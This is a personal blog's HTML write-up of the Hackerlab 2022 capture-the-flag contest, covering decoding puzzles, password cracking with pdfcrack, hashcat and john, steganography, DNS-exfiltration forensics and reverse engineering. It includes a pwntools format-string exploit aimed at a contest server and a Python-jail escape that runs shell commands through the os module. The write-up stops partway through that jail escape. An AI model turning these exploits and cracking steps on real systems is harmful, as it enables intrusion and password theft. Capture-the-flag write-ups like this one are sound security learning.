<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Ok so I was part of the hackerlab, a CTF (the only one?) hosted by my country. And this year they extended it to all the (16) countries of ECOWAS. It was a great experience, even though I didnt make it to the finals.
I decided to make some writeups.
There were two types of challenges:
Basics (like the name says&amp;hellip;) Stages: The real thing! you unlocked those one by one I wanted to make separate writeups but I got lazy, so I will do everything here, In this single file." />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/hackerlab/hackerlab-2022/" />


    <title>
        
            Hackerlab 2022 :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Hackerlab 2022">
<meta itemprop="description" content="Ok so I was part of the hackerlab, a CTF (the only one?) hosted by my country. And this year they extended it to all the (16) countries of ECOWAS. It was a great experience, even though I didnt make it to the finals.
I decided to make some writeups.
There were two types of challenges:
Basics (like the name says&hellip;) Stages: The real thing! you unlocked those one by one I wanted to make separate writeups but I got lazy, so I will do everything here, In this single file."><meta itemprop="datePublished" content="2022-09-16T18:33:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="2494"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Hackerlab 2022"/>
<meta name="twitter:description" content="Ok so I was part of the hackerlab, a CTF (the only one?) hosted by my country. And this year they extended it to all the (16) countries of ECOWAS. It was a great experience, even though I didnt make it to the finals.
I decided to make some writeups.
There were two types of challenges:
Basics (like the name says&hellip;) Stages: The real thing! you unlocked those one by one I wanted to make separate writeups but I got lazy, so I will do everything here, In this single file."/>



    <meta property="og:title" content="Hackerlab 2022" />
<meta property="og:description" content="Ok so I was part of the hackerlab, a CTF (the only one?) hosted by my country. And this year they extended it to all the (16) countries of ECOWAS. It was a great experience, even though I didnt make it to the finals.
I decided to make some writeups.
There were two types of challenges:
Basics (like the name says&hellip;) Stages: The real thing! you unlocked those one by one I wanted to make separate writeups but I got lazy, so I will do everything here, In this single file." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/hackerlab/hackerlab-2022/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-16T18:33:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="Hackerlab" />



    <meta property="article:published_time" content="2022-09-16 18:33:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/hackerlab/hackerlab-2022/">Hackerlab 2022</a></h2>

            
            
            

            <div class="post-content">
                
    <img src="http://localhost:1313/hackerlab2022/hacklab.png"  alt="Hackerlab"  class="left"  />


<p>Ok so I was part of the hackerlab, a CTF (the only one?) hosted by my country.
And this year they extended it to all the (16) countries of ECOWAS.
It was a great experience, even though I didnt make it to the finals.</p>
<p>I decided to make some writeups.</p>
<p>There were two types of challenges:</p>
<ul>
<li>Basics (like the name says&hellip;)</li>
<li>Stages: The real thing! you unlocked those one by one</li>
</ul>
<p>I wanted to make separate writeups but I got lazy, so I will do everything here, In this single file.</p>
<p>I won&rsquo;t therefore explain everything, or this will turn into a book. So here we go!</p>
<h2 id="basics">Basics</h2>
<h3 id="discord">Discord</h3>
<ul>
<li>points = 5</li>
<li>status = solved</li>
</ul>
<p>This was just basically for filtering people. They pinned a welcome message in the discord server with this:
<code>PGS_nE3L0HE34ql??????????</code></p>
<p>I just went to the <a href="https://gchq.github.io/">kitchen</a> and added some ROT13 sauce to get served with the flag.</p>
<h3 id="youtube">Youtube</h3>
<ul>
<li>points = 5</li>
<li>status = solved</li>
</ul>
<p>Same value as &ldquo;Discord&rdquo; challenge.
In the details of their announcement video (on youtube) you can see some very obvious binary.</p>
<pre tabindex="0"><code>00100001 00100001 00100001 00110010 00110011 00110110 00110001 00110001 00110010 
00110110 00110010 00110111 01101001 01110100 00110000 01000111 00110001 
01011111 01000110 01010100 01000011
</code></pre><p>Just go to the <a href="https://gchq.github.io/">kitchen</a> again, but this time be careful, there is two sauces to use.</p>
<h3 id="jsfuck">Jsfuck</h3>
<ul>
<li>points = 10</li>
<li>status = solved</li>
</ul>
<p>This one was fun, because the name itself is a big hint, but the challenge was actually finding the javascript to deobfuscate.
Took me way to much more time than needed but remember to check all the files,
even <code>awesome-fonts.js</code> (sometimes people hide things in css files too so&hellip;yeah).</p>
<p>Use some google-fu to deobfuscate the jsfuck</p>
<p>Add some clarity in their nonsenses</p>
<pre tabindex="0"><code>cipher = [67, 85, 68, 92, 55, 49, 51, 94, 90, 56, 109, 99, 59, 50, 63, 61, 35, 37]
var f = &#34;&#34;
function xor_xor(x, y) {
	return x ^ y;
}
for (var i = 0; i &lt; cipher.length; i++) {
	f += &#34; &#34; + xor_xor(cipher[i] ^ i);
}
console.log(f);
</code></pre><p>Go to the <a href="https://gchq.github.io/">kitchen</a></p>
<p>Decimal ascii code salsa aaaaand f*ck &rsquo;em!!</p>
<h3 id="secret-pdf">Secret pdf</h3>
<ul>
<li>points = 20</li>
<li>status = solved</li>
</ul>
<p>You get an <a href="http://localhost:1313/hackerlab2022/secret.pdf">encrypted pdf</a></p>
<p>john (the ripper)? hashcat? well whatever suits your needs!</p>
<p>I simply used <code>pdfcrack</code> lol</p>
<pre tabindex="0"><code>└──╼ $pdfcrack -f secret.pdf -w /usr/share/wordlists/rockyou.txt
PDF version 1.7
Security Handler: Standard
V: 2
R: 3
P: -1060
Length: 128
Encrypted Metadata: True
FileID: 15c0aee17f397540bdec4edb020a2247
U: 447e5ab472a0d9557b9f8664bb73c00900000000000000000000000000000000
O: cc34bdea75a5d9ac0346d4a2adcb39ac72d8aeb6dc275e4b187fb19d3cdd2cf1
Average Speed: 34373.2 w/s. Current Word: &#39;bluepoint&#39;
Average Speed: 34360.6 w/s. Current Word: &#39;protea&#39;
Average Speed: 34054.4 w/s. Current Word: &#39;alison1402&#39;
Average Speed: 34566.6 w/s. Current Word: &#39;willie331&#39;

...[REDACTED]

Average Speed: 32446.0 w/s. Current Word: &#39;aidenhornsby&#39;
found user-password: &#39;MyP@ssw0rd!&#39;
</code></pre><p>Then when you open the pdf select the WHOLE PAGE (ALL OF IT)</p>
<p>back to the <a href="https://gchq.github.io/">kitchen</a> to decode the hidden text. Big hint: ASCII OCTAL CHARACTERS!</p>
<h3 id="secret-doc">Secret doc</h3>
<ul>
<li>points = 30</li>
<li>status = unsolved</li>
</ul>
<p>That&rsquo;s where I started to be stupid. The thing is&hellip;I was on the right track most of the times.</p>
<p>I tried to bruteforce the <a href="http://localhost:1313/hackerlab2022/secret.docx">encrypted docx file</a></p>
<pre tabindex="0"><code>└──╼ $python2 /usr/share/john/office2john.py secret.docx &gt; secret.txt
└──╼ $cat secret.txt
secret.docx:$office$*2013*100000*256*16*744b3976099...[REDACTED MAD LONG HASH]

└──╼ $hashcat -a 0 -m 9600 secret.txt /usr/share/wordlists/rockyou.txt
...

Hashfile &#39;secret.txt&#39; on line 1 (secret...8bcc10dca254a958b40b018d07ac5670): Signature unmatched
No hashes loaded.
</code></pre><p>Why didnt it work? format! hashcat doesnt recognize what john produced so remove the name</p>
<pre tabindex="0"><code>└──╼ $cat secret.txt
$office$*2013*100000*256*16*744b3976099d...[REDACTED MAD LONG HASH]
</code></pre><p>Started but took so damn long I started to think it wasn&rsquo;t about bruteforcing&hellip;</p>
<p>Seems like I was wrong&hellip;It was! I Just needed to try harder! (or get a better computer)</p>
<p>According to <a href="https://github.com/TargetRoot/CTF">those guys</a>
<code>└──╼ $hashcat -a 0 -m 9600 hash.txt /usr/share/wordlists/rockyou.txt</code> was supposed to give me the password <code>H4cK3r</code></p>
<p>And just like for the secret pdf challenge there were hidden characters so SELECT EVERYTHING!</p>
<p>You get this: <code>DSAXC7D.86543Eur04&amp;&amp;</code> (hint: XOR)</p>
<p>But what is the key?</p>
<p><a href="https://github.com/TargetRoot/CTF">those guys</a> used did a clever scripting move</p>
<p>knowing the flag format is &ldquo;CTF_whatever&rdquo; using python to compare the characters xor indeed gives you the key</p>
<pre tabindex="0"><code>python -c &#34;for i,j in zip(list(&#39;CTF_&#39;),list(&#39;DSAX&#39;)): print(ord(i)^ord(j))&#34;
</code></pre><p>Then simply decode it</p>
<pre tabindex="0"><code>python3 -c &#34;for i in &#39;DSAXC7D.86543Eur04&amp;&amp;&#39;: print(chr(ord(i)^7),end=&#39;&#39;)&#34;
</code></pre><p>But if you are not a clever scripter (no judging) just go to the
<a href="https://gchq.github.io/">kitchen</a> and Bruteforce that XOR. You get the flag anyway you want.</p>
<h3 id="amazone">Amazone</h3>
<ul>
<li>points = 50</li>
<li>status = unsolved</li>
</ul>

    <img src="http://localhost:1313/hackerlab2022/Amazone.jpeg"  alt="amazone"  class="center"  style="width: 300px;"  />


<p>Ok This one is steganography and my favorite one. But I didnt solve it!</p>
<p>Again I was so close&hellip;I was mislead by the &ldquo;Let me talk!&rdquo;</p>
<p>It was the classics&hellip;exif data empty, steghide show data but passphrase needed</p>
<p><code>stegseek</code> was the next logical thing&hellip;but failed!</p>
<p>Another hint was <code>leet</code>&hellip;the passphrase was simply &ldquo;amazone&rdquo; in leetspeak</p>
<p>I mean&hellip;just <code>4m4z0n3</code> (I felt stupid a bit)</p>
<p>With that you extract the flag directly!</p>
<h3 id="ecowas-portal">Ecowas Portal</h3>
<ul>
<li>points = 50</li>
<li>status = unsolved</li>
</ul>
<p>It&rsquo;s Reverse engineering&hellip;yes we all love those</p>
<p>Decompile the <a href="2022/ecowas_portal">binary file</a> with your favorite thing</p>
<p>I discovered <a href="https://dogbolt.org/">dogbolt</a> doing this. It&rsquo;s a cool one as you get multiple decompilers at the same time</p>
<p>You get interresting variables and an encryption function (r2 or ghidra)</p>
<p>Once you understand how it works you can easily write a script to reverse the encrypt method and get the flag</p>
<blockquote>
<p>&ldquo;It subtracts 0x14 (20) then makes an xor of the result with the index of the character variable&rdquo;</p>
</blockquote>
<h3 id="zoro">Zoro</h3>
<ul>
<li>points = 50</li>
<li>status = solved</li>
</ul>
<p>I finally got my sh*t together and used some common sense.</p>
<p>Download that <a href="2022/hackerlab.txt">totally not suspicious text file</a></p>
<pre tabindex="0"><code>└──╼ $file hackerlab.txt
hackerlab.txt: UTF-8 Unicode text, with very long lines, with no line terminators 
</code></pre><p>I was confused a bit (<code>xxd</code> confirms) but A LOT of GOOGLE-FU solved this one</p>
<p>hint: <code>Zero-width characters</code> That&rsquo;s all you need</p>
<p>Also maybe <a href="https://330k.github.io/misc_tools/unicode_steganography.html">This</a></p>
<h2 id="stages">Stages</h2>
<h3 id="exfiltration">Exfiltration</h3>
<ul>
<li>points = 300</li>
<li>status = solved</li>
</ul>
<p>ooh forensics&hellip;much detective&hellip;much suspense</p>
<p>You get a <a href="2022/capture.pcap">Capture file</a> so obviously you open wireshark and google &ldquo;dns exfiltration&rdquo;&hellip;then</p>
<pre tabindex="0"><code>└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y &#34;dns.flags.response eq 0 &amp;&amp; ip.dst==192.168.169.2&#34; &gt; output.txt
</code></pre><p>and clean the junk out</p>
<pre tabindex="0"><code>└──╼ $cat output.txt | sed &#39;s/.hackerlab.africa//g&#39; &gt; clean_out.txt
</code></pre><p>Or in one take:
<code>tshark -r capture.pcap -T fields -e dns.qry.name -Y &quot;dns.flags.response eq 0 &amp;&amp; ip.dst==192.168.169.2&quot; | sed 's/.hackerlab.africa//g' &gt; output.txt</code></p>
<p>Now go to the kitchen (cyberchef)</p>
<p>from hex and then png download&hellip;aaaand it&rsquo;s messed up</p>
<pre tabindex="0"><code>└──╼ $binwalk output.dat

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 757 x 459, 8-bit/color RGB, non-interlaced
24375         0x5F37          End of Zip archive, footer length: 22
</code></pre><p>??? wtf? there is two files?</p>
<p>The file I got was messed because there is actually two files to extract and we were fusing them!</p>
<p>we need to separate by request types (CNAME = 5 and A = 1 )</p>
<pre tabindex="0"><code>└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y &#34;dns.flags.response eq 0 &amp;&amp; ip.dst==192.168.169.2 &amp;&amp; dns.qry.type==1&#34; | sed &#39;s/.hackerlab.africa//g&#39; &gt; output1.txt 

└──╼ $tshark -r capture.pcap -T fields -e dns.qry.name -Y &#34;dns.flags.response eq 0 &amp;&amp; ip.dst==192.168.169.2 &amp;&amp; dns.qry.type==5&#34; | sed &#39;s/.hackerlab.africa//g&#39; &gt; output2.txt 
</code></pre><p>Now with two output files I go back to the kitchen and extract files from them separately</p>
<p>I got a clear png now that hints me to bruteforcing</p>
<p>and a zlib/zip file?</p>
<pre tabindex="0"><code>└──╼ $file flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w
flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w: Zip archive data, at least v2.0 to extract

└──╼ $unzip flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w
Archive:  flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w
inflating: flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v
</code></pre><p>Lol..when you unzip it inflates to a file with one less letter in the name</p>
<p>this is gonna take years LMAO so let&rsquo;s automate this (srcipt it is) until&hellip;</p>
<pre tabindex="0"><code>Archive:  flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a
End-of-central-directory signature not found.  Either this file is not
a zipfile, or it constitutes one disk of a multi-part archive.  In the
latter case the central directory and zipfile comment will be found on
the last disk(s) of this archive.
</code></pre><p>Now there is one that is not a zip?</p>
<p>Delete all the needless junk and keep <code>flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a</code></p>
<pre tabindex="0"><code>└──╼ $file flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a
flag.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.a.b.c.d.e.f.g.h.i.j.k.l.m.n.o.p.q.r.s.t.u.v.w.w.v.u.t.s.r.q.p.o.n.m.l.k.j.i.h.g.f.e.d.c.b.a: XZ compressed data
</code></pre><p>Obviously&hellip;(XD)</p>
<p>the xs archives have a zip extension so <code>unxz</code> fails! rename to .xz then unxz several times (chunks are removed from file size) (rinse and repeat or automate ) Until&hellip;</p>
<pre tabindex="0"><code class="language-└──╼" data-lang="└──╼">
unxz : flag.xz: Format de fichier inconnu

└──╼ $file flag.xz
flag.xz: bzip2 compressed data, block size = 900k
</code></pre><p>LMAO! They just like to make people suffer! change the extraction method and&hellip;</p>
<pre tabindex="0"><code>└──╼ $file flag
flag: gzip compressed data, last modified: Tue Jul 26 19:46:33 2022, from Unix, original size modulo 2^32 939
</code></pre><p>BACK TO GZIP??? CMOOOOOON&hellip;spam extract again (wtf??? lol)</p>
<pre tabindex="0"><code>└──╼ $mv flag flag.gz &amp;&amp; gunzip flag.gz

gzip: flag.gz: encrypted file -- use unzip
</code></pre><p>FINALLY! Back to reality! unzip it and realise its now the PNG&rsquo;s hint serves</p>
<pre tabindex="0"><code>└──╼ $unzip flag.zip 
Archive:  flag.zip
[flag.zip] flag.txt password: 
</code></pre><p>Crack this sht</p>
<pre tabindex="0"><code>└──╼ $zip2john flag.zip &gt; zip_hash.txt
ver 2.0 efh 5455 efh 7875 flag.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=330, decmplen=3403, crc=F6E944AC


└──╼ $john zip_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
...
0g 0:00:03:44  3/3 0g/s 9571Kp/s 9571Kc/s 9571KC/s kyolchou..kyolbagg
3c0w45           (flag.zip/flag.txt)
1g 0:00:04:42 DONE 3/3 (2022-08-28 18:21) 0.003535g/s 9810Kp/s 9810Kc/s 9810KC/s 3c0gbi..3c0igd
Use the &#34;--show&#34; option to display all of the cracked passwords reliably
Session completed
</code></pre><p>Now the flag is a <a href="Assets/flag.txt">QR code</a></p>
<p>scan it with anything you want (zbartools dont work with txt files so you can flameshot it first or whatever) anyway&hellip;ggwp</p>
<h3 id="breakme">Breakme</h3>
<ul>
<li>points = 300</li>
<li>status = unsolved</li>
</ul>
<p>I think I could do this one but I ran out of time&hellip;</p>
<p>Anyway&hellip;get the archive, explore the files and notice the <a href="2022/main.py">main.py module</a></p>
<p>It&rsquo;s RE so understand what it does and&hellip;well&hellip;reverse it</p>
<p><a href="https://github.com/TargetRoot/CTF">those guys</a> wrote a nice <a href="2022/solve_breakme.py">solution</a> that gives you a base32 encoded string (just like the hint said)</p>
<p>It&rsquo;s a pastebin link leading to a 3D obj file (made in blender)</p>
<p>Find any <a href="https://3dviewer.net/">3D viewer</a> to open it and get some morse in 3D (incredible)</p>
<p>Back to the <a href="https://gchq.github.io/">kitchen</a> to get that flag</p>
<h3 id="invisible">Invisible</h3>
<ul>
<li>points = 300</li>
<li>status = unsolved</li>
</ul>
<p>Get the <a href="2022/invisible">Binary</a>&hellip;It&rsquo;s pwn so you know what to do already</p>
<p>It&rsquo;s all about <code>ELF x64 - Format string bug</code></p>
<p>I might update this later with more details but as I didnt solve it I will simply reffer to <a href="https://github.com/TargetRoot/CTF">those guys</a>&rsquo;s solution using <code>pwntools</code> on remote</p>
<pre tabindex="0"><code>from pwn import *
from time import sleep
context.arch = &#39;amd64&#39;
for i in range(500):
	conn=remote(&#39;51.38.37.81&#39;,1234)
	payload=fmtstr_payload(8,{0x000000000040405c:200})
	conn.sendline(payload)
	print(conn.recvall())
	conn.close()
	sleep(0.1)
</code></pre><h3 id="queen">Queen</h3>
<ul>
<li>points = 550</li>
<li>status = unsolved</li>
</ul>
<p>This one had the most points?? wow</p>
<p>First google <code>python jail</code></p>
<p>Connect to the server</p>
<pre tabindex="0"><code>└──╼ $nc 51.38.37.81 7002
Please, save me from this hell :&#39;(
&gt;&gt;&gt; 
</code></pre><p>Checking if <code>sys</code> is present</p>
<pre tabindex="0"><code>&gt;&gt;&gt; print sys
&lt;module &#39;sys&#39; (built-in)&gt;

&gt;&gt;&gt; print dir(sys)
[&#39;__displayhook__&#39;, &#39;__doc__&#39;, &#39;__excepthook__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__stderr__&#39;, &#39;__stdin__&#39;, &#39;__stdout__&#39;, &#39;_clear_type_cache&#39;, &#39;_current_frames&#39;, &#39;_getframe&#39;, &#39;_git&#39;, &#39;api_version&#39;, &#39;argv&#39;, &#39;builtin_module_names&#39;, &#39;byteorder&#39;, &#39;call_tracing&#39;, &#39;callstats&#39;, &#39;copyright&#39;, &#39;displayhook&#39;, &#39;dont_write_bytecode&#39;, &#39;exc_clear&#39;, &#39;exc_info&#39;, &#39;exc_type&#39;, &#39;excepthook&#39;, &#39;exec_prefix&#39;, &#39;executable&#39;, &#39;exit&#39;, &#39;flags&#39;, &#39;float_info&#39;, &#39;float_repr_style&#39;, &#39;getcheckinterval&#39;, &#39;getdefaultencoding&#39;, &#39;getdlopenflags&#39;, &#39;getfilesystemencoding&#39;, &#39;getprofile&#39;, &#39;getrecursionlimit&#39;, &#39;getrefcount&#39;, &#39;getsizeof&#39;, &#39;gettrace&#39;, &#39;hexversion&#39;, &#39;long_info&#39;, &#39;maxint&#39;, &#39;maxsize&#39;, &#39;maxunicode&#39;, &#39;meta_path&#39;, &#39;modules&#39;, &#39;path&#39;, &#39;path_hooks&#39;, &#39;path_importer_cache&#39;, &#39;platform&#39;, &#39;prefix&#39;, &#39;py3kwarning&#39;, &#39;setcheckinterval&#39;, &#39;setdlopenflags&#39;, &#39;setprofile&#39;, &#39;setrecursionlimit&#39;, &#39;settrace&#39;, &#39;stderr&#39;, &#39;stdin&#39;, &#39;stdout&#39;, &#39;subversion&#39;, &#39;version&#39;, &#39;version_info&#39;, &#39;warnoptions&#39;]

&gt;&gt;&gt; print sys.modules
{&#39;copy_reg&#39;: &lt;module &#39;copy_reg&#39; from &#39;/usr/local/lib/python2.7/copy_reg.py&#39;&gt;, &#39;sre_compile&#39;: &lt;module &#39;sre_compile&#39; from &#39;/usr/local/lib/python2.7/sre_compile.py&#39;&gt;, &#39;_sre&#39;: &lt;module &#39;_sre&#39; (built-in)&gt;, &#39;encodings&#39;: &lt;module &#39;encodings&#39; from &#39;/usr/local/lib/python2.7/encodings/__init__.py&#39;&gt;, &#39;site&#39;: &lt;module &#39;site&#39; from &#39;/usr/local/lib/python2.7/site.py&#39;&gt;, &#39;__builtin__&#39;: &lt;module &#39;?&#39; (built-in)&gt;, &#39;sysconfig&#39;: &lt;module &#39;sysconfig&#39; from &#39;/usr/local/lib/python2.7/sysconfig.py&#39;&gt;, &#39;__main__&#39;: &lt;module &#39;__main__&#39; from &#39;chal.py&#39;&gt;, &#39;encodings.encodings&#39;: None, &#39;abc&#39;: &lt;module &#39;abc&#39; from &#39;/usr/local/lib/python2.7/abc.py&#39;&gt;, &#39;posixpath&#39;: &lt;module &#39;posixpath&#39; from &#39;/usr/local/lib/python2.7/posixpath.py&#39;&gt;, &#39;_weakrefset&#39;: &lt;module &#39;_weakrefset&#39; from &#39;/usr/local/lib/python2.7/_weakrefset.py&#39;&gt;, &#39;errno&#39;: &lt;module &#39;errno&#39; (built-in)&gt;, &#39;encodings.codecs&#39;: None, &#39;sre_constants&#39;: &lt;module &#39;sre_constants&#39; from &#39;/usr/local/lib/python2.7/sre_constants.py&#39;&gt;, &#39;re&#39;: &lt;module &#39;re&#39; from &#39;/usr/local/lib/python2.7/re.py&#39;&gt;, &#39;_abcoll&#39;: &lt;module &#39;_abcoll&#39; from &#39;/usr/local/lib/python2.7/_abcoll.py&#39;&gt;, &#39;types&#39;: &lt;module &#39;types&#39; from &#39;/usr/local/lib/python2.7/types.py&#39;&gt;, &#39;_codecs&#39;: &lt;module &#39;_codecs&#39; (built-in)&gt;, &#39;encodings.__builtin__&#39;: None, &#39;_warnings&#39;: &lt;module &#39;_warnings&#39; (built-in)&gt;, &#39;genericpath&#39;: &lt;module &#39;genericpath&#39; from &#39;/usr/local/lib/python2.7/genericpath.py&#39;&gt;, &#39;stat&#39;: &lt;module &#39;stat&#39; from &#39;/usr/local/lib/python2.7/stat.py&#39;&gt;, &#39;zipimport&#39;: &lt;module &#39;zipimport&#39; (built-in)&gt;, &#39;_sysconfigdata&#39;: &lt;module &#39;_sysconfigdata&#39; from &#39;/usr/local/lib/python2.7/_sysconfigdata.py&#39;&gt;, &#39;warnings&#39;: &lt;module &#39;warnings&#39; from &#39;/usr/local/lib/python2.7/warnings.py&#39;&gt;, &#39;UserDict&#39;: &lt;module &#39;UserDict&#39; from &#39;/usr/local/lib/python2.7/UserDict.py&#39;&gt;, &#39;encodings.utf_8&#39;: &lt;module &#39;encodings.utf_8&#39; from &#39;/usr/local/lib/python2.7/encodings/utf_8.py&#39;&gt;, &#39;sys&#39;: &lt;module &#39;sys&#39; (built-in)&gt;, &#39;codecs&#39;: &lt;module &#39;codecs&#39; from &#39;/usr/local/lib/python2.7/codecs.py&#39;&gt;, &#39;os.path&#39;: &lt;module &#39;posixpath&#39; from &#39;/usr/local/lib/python2.7/posixpath.py&#39;&gt;, &#39;_locale&#39;: &lt;module &#39;_locale&#39; from &#39;/usr/local/lib/python2.7/lib-dynload/_locale.so&#39;&gt;, &#39;signal&#39;: &lt;module &#39;signal&#39; (built-in)&gt;, &#39;traceback&#39;: &lt;module &#39;traceback&#39; from &#39;/usr/local/lib/python2.7/traceback.py&#39;&gt;, &#39;linecache&#39;: &lt;module &#39;linecache&#39; from &#39;/usr/local/lib/python2.7/linecache.py&#39;&gt;, &#39;posix&#39;: &lt;module &#39;posix&#39; (built-in)&gt;, &#39;encodings.aliases&#39;: &lt;module &#39;encodings.aliases&#39; from &#39;/usr/local/lib/python2.7/encodings/aliases.py&#39;&gt;, &#39;exceptions&#39;: &lt;module &#39;exceptions&#39; (built-in)&gt;, &#39;sre_parse&#39;: &lt;module &#39;sre_parse&#39; from &#39;/usr/local/lib/python2.7/sre_parse.py&#39;&gt;, &#39;os&#39;: &lt;module &#39;os&#39; from &#39;/usr/local/lib/python2.7/os.py&#39;&gt;, &#39;_weakref&#39;: &lt;module &#39;_weakref&#39; (built-in)&gt;}
</code></pre><p>Os module allow code execution&hellip;so yeah</p>
<pre tabindex="0"><code>&gt;&gt;&gt; print sys.modules[&#39;os&#39;].system(&#39;ls -al&#39;)               
total 28
drwxr-x--- 1 root ecowas 4096 Aug  3 20:40 .
drwxr-xr-x 1 root root   4096 Aug  3 22:51 ..
-rwxr-x--- 1 root ecowas 8916 Aug  3 20:39 chal.py
-rwxr----- 1 root ecowas   21 Aug  3 19:48 flag.txt
